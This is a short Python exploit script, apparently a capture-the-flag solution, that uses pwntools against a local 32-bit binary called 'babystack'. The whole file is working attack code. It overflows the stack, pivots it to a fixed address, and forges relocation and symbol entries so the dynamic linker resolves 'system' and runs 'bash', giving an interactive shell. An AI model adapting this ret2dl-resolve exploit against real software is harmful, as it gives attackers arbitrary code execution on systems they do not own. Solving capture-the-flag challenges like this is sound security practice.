#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *

context.log_level="debug"
pwn_file="./babystack"
elf=ELF(pwn_file)
gadget=lambda x:next(elf.search(asm(x),arch="x86"))

conn=process("./babystack")

def debug():
    log.debug("pid :%x"%conn.pid)
    pause()

new_stack=0x804af00
f={
    0x28:p32(new_stack),
    0x2c:p32(0x0804844c),
    0x30:p32(0),
    0x34:p32(new_stack),
    0x38:p32(0x400),
    
}
p1=fit(f,filler="\x00",length=0x40)

jump_tab=0x80482B0
str_tab=0x0804822C
sym_tab=0x080481CC

fake_rela=new_stack+0x30
fake_sym=new_stack+0x5c
fake_name=new_stack+0x70

f={
    0x4:p32(0x80482F0),
    0x8:p32(fake_rela-jump_tab),
    0x10:p32(new_stack+0x78),
    0x30:p32(elf.got["read"])+p8(7)+p16((fake_sym-sym_tab)/0x10),
    0x5c:p32(fake_name-str_tab)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0),
    0x70:"system\x00",
    0x78:"bash\x00"
}

p2=fit(f,filler="\x00")
conn.send(p1+p2)

conn.interactive()




